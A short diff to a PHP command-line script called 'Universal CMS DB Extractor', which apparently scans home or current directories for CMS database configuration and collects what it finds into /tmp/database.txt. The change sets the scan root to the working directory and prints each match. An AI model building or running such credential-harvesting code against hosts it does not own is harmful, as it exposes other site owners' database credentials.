@@ -1,8 +1,9 @@
 #!/usr/bin/php
 <?php
 // Universal CMS DB Extractor - PHP Version
+// Modified to scan from current directory
 
-$baseDir = "/home";
+$baseDir = getcwd(); // Menggunakan direktori saat ini
 $outputFile = "/tmp/database.txt";
 file_put_contents($outputFile, "");
 
@@ -100,6 +101,7 @@ foreach ($iterator as $file) {
             $output .= "\n";
             
             file_put_contents($outputFile, $output, FILE_APPEND);
+            echo "Found: $filePath\n";
         }
     }
 }
